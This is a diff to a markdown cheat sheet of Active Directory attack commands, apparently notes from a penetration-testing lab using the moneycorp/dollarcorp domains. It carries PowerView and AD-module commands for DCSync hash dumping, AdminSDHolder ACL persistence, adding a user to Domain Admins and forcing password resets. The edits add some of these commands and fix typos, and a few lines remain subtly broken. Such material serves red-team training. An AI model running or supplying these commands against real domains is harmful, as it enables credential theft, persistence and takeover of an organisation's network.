@@ -178,7 +178,7 @@ Rubeus.exe diamond
 
 ## 🔁DCSync Attack
 
-**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**
+**To use the DCSync feature for getting krbtgt, or the hash of any user hash, execute the following command - require DA privs:**
 
 {% code overflow="wrap" %}
 ```powershell
@@ -381,7 +381,7 @@ Set-DCPermissions -Method AdminSDHolder -SAMAccountName username -Right GenericA
 ```
 {% endcode %}
 
-❓ Still working? Using ActiveDirectory Moduel and Set-ADACL:
+❓ Is the following still working? Using ActiveDirectory Moduel and Set-ADACL:
 
 {% code overflow="wrap" %}
 ```powershell
@@ -389,7 +389,7 @@ Set-ADACL -DistinguisedName 'CN=AdminSDHolder,CN=System,DC=subdom,DC=dom,DC=loca
 ```
 {% endcode %}
 
-Do the propagtion:
+Do the propagation:
 
 {% code overflow="wrap" %}
 ```powershell
@@ -413,13 +413,10 @@ Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_
 ```
 {% endcode %}
 
-
-
 **Get ACL of an Object for a specific user**
 
 {% code overflow="wrap" %}
 ```powershell
-. .\PowerView.ps1
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDS | ?{$_.IdentityReference -atch 'username'}
 
 (Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=subdom,DC=dom,DC=local').Access | ?{$_.IdentityReference -match 'username'} 
@@ -435,7 +432,9 @@ Using AD Module
 {% code overflow="wrap" %}
 ```powershell
 . .\PowerView_dev.ps1
-Add-DomainGroupMember -identity 'domain admins' -members yourusername -verbose
+Add-DomainGroupMember -identity 'domain admins' -members yourusername -verbose -domain dom.local
+
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dcdollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 
 Using AD Module
 Add-ADGroupMember -identity 'domain admins' -members yourusername -verbose
@@ -444,14 +443,14 @@ Add-ADGroupMember -identity 'domain admins' -members yourusername -verbose
 
 **ResetPassword using PowerView\_dev**
 
-{% code overflow="wrap" %}
-```powershell
-Set-DomainUserPassword -identity yourusername -accountpassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose
-
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Add-DomainObjectAcl -TargetIdentity
+'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+<strong>
+</strong><strong>Set-DomainUserPassword -identity yourusername -accountpassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose
+</strong>
 Using AD Module
 Set-ADAccountPassword -Identity yourusername -newPassword (ConvertTo-SecureString "Password1!" -AsPlainText -Force) - Verbose
-```
-{% endcode %}
+</code></pre>
 
 ## 🔑ACL - Right Abuse / DCSync&#x20;
 
